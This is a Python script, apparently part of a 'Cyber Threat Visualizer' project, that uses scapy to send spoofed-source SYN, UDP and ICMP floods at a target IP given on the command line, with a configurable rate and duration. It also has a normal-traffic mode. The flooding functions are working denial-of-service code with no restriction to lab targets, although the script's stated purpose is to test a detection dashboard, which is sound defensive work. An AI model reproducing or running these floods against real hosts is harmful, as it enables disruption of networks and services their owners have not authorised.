#!/usr/bin/env python3
"""DDoS attack simulation for testing the Cyber Threat Visualizer."""
import asyncio
import random
import time
import json
import argparse
import sys
import os
from typing import List

# Add project root to Python path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.all import IP, TCP, UDP, ICMP, Raw, send
from scapy.layers.inet import TCP, UDP, ICMP

from backend.utils.redis_client import redis_manager
from backend.config import settings


class DDoSSimulator:
    """Simulates various DDoS attack patterns."""
    
    def __init__(self, target_ip: str, target_port: int = 80, rate: int = 1000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.rate = rate  # packets per second
        self.running = False
        self.src_ips = [
            f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
            for _ in range(50)
        ]
    
    async def start_syn_flood(self, duration: int = 60) -> None:
        """Simulate SYN flood attack."""
        print(f"[+] Starting SYN flood against {self.target_ip}:{self.target_port}")
        print(f"    Rate: {self.rate} pps | Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        packet_count = 0
        
        interval = 1.0 / self.rate
        
        while self.running and (time.time() - start_time) < duration:
            batch_start = time.time()
            
            # Send batch of packets
            batch_size = min(100, self.rate // 10)
            for _ in range(batch_size):
                src_ip = random.choice(self.src_ips)
                src_port = random.randint(1024, 65535)
                
                # Create SYN packet
                pkt = IP(src=src_ip, dst=self.target_ip) / \
                      TCP(sport=src_port, dport=self.target_port, flags='S', seq=random.randint(1, 4294967295))
                
                # Send packet (non-blocking)
                send(pkt, verbose=0)
                packet_count += 1
            
            # Rate limiting
            elapsed = time.time() - batch_start
            sleep_time = max(0, (batch_size * interval) - elapsed)
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)
        
        print(f"[+] SYN flood completed. Total packets: {packet_count}")
    
    async def start_udp_flood(self, duration: int = 60) -> None:
        """Simulate UDP flood attack."""
        print(f"[+] Starting UDP flood against {self.target_ip}:{self.target_port}")
        print(f"    Rate: {self.rate} pps | Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        packet_count = 0
        
        interval = 1.0 / self.rate
        
        while self.running and (time.time() - start_time) < duration:
            batch_start = time.time()
            
            batch_size = min(100, self.rate // 10)
            for _ in range(batch_size):
                src_ip = random.choice(self.src_ips)
                src_port = random.randint(1024, 65535)
                
                # Create UDP packet with random payload
                payload_size = random.randint(64, 1400)
                payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                
                pkt = IP(src=src_ip, dst=self.target_ip) / \
                      UDP(sport=src_port, dport=self.target_port) / \
                      Raw(load=payload)
                
                send(pkt, verbose=0)
                packet_count += 1
            
            elapsed = time.time() - batch_start
            sleep_time = max(0, (batch_size * interval) - elapsed)
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)
        
        print(f"[+] UDP flood completed. Total packets: {packet_count}")
    
    async def start_icmp_flood(self, duration: int = 60) -> None:
        """Simulate ICMP flood (ping flood)."""
        print(f"[+] Starting ICMP flood against {self.target_ip}")
        print(f"    Rate: {self.rate} pps | Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        packet_count = 0
        
        interval = 1.0 / self.rate
        
        while self.running and (time.time() - start_time) < duration:
            batch_start = time.time()
            
            batch_size = min(100, self.rate // 10)
            for _ in range(batch_size):
                src_ip = random.choice(self.src_ips)
                
                pkt = IP(src=src_ip, dst=self.target_ip) / \
                      ICMP(type=8, code=0) / \
                      Raw(load=b'X' * 64)
                
                send(pkt, verbose=0)
                packet_count += 1
            
            elapsed = time.time() - batch_start
            sleep_time = max(0, (batch_size * interval) - elapsed)
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)
        
        print(f"[+] ICMP flood completed. Total packets: {packet_count}")
    
    def stop(self):
        self.running = False


async def simulate_normal_traffic(target_ip: str, duration: int = 60) -> None:
    """Simulate normal background traffic."""
    print(f"[+] Simulating normal traffic to {target_ip} for {duration}s")
    
    protocols = ['TCP', 'UDP', 'ICMP']
    common_ports = [80, 443, 22, 21, 25, 53, 123, 8080, 8443]
    src_ips = [f"10.0.{random.randint(1, 255)}.{random.randint(1, 254)}" for _ in range(20)]
    
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration:
        proto = random.choice(protocols)
        src_ip = random.choice(src_ips)
        dst_port = random.choice(common_ports)
        src_port = random.randint(1024, 65535)
        
        if proto == 'TCP':
            flags = random.choice(['S', 'SA', 'A', 'PA', 'FA'])
            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=dst_port, flags=flags)
        elif proto == 'UDP':
            payload = bytes([random.randint(0, 255) for _ in range(random.randint(64, 512))])
            pkt = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=dst_port) / Raw(load=payload)
        else:
            pkt = IP(src=src_ip, dst=target_ip) / ICMP()
        
        send(pkt, verbose=0)
        packet_count += 1
        
        # Random interval for realistic traffic
        await asyncio.sleep(random.uniform(0.001, 0.1))
    
    print(f"[+] Normal traffic simulation completed. Packets: {packet_count}")


async def main():
    parser = argparse.ArgumentParser(description='DDoS Attack Simulator for Cyber Threat Visualizer')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--rate', type=int, default=1000, help='Packets per second')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--type', choices=['syn', 'udp', 'icmp', 'normal', 'all'], default='syn', help='Attack type')
    
    args = parser.parse_args()
    
    # Check for root privileges
    import os
    if os.geteuid() != 0:
        print("[!] Warning: Packet sending requires root privileges")
        print("    Run with: sudo python simulate_ddos.py ...")
        return
    
    simulator = DDoSSimulator(args.target, args.port, args.rate)
    
    try:
        if args.type == 'syn' or args.type == 'all':
            await simulator.start_syn_flood(args.duration)
        
        if args.type == 'udp' or args.type == 'all':
            await simulator.start_udp_flood(args.duration)
        
        if args.type == 'icmp' or args.type == 'all':
            await simulator.start_icmp_flood(args.duration)
        
        if args.type == 'normal':
            await simulate_normal_traffic(args.target, args.duration)
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        simulator.stop()
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    asyncio.run(main())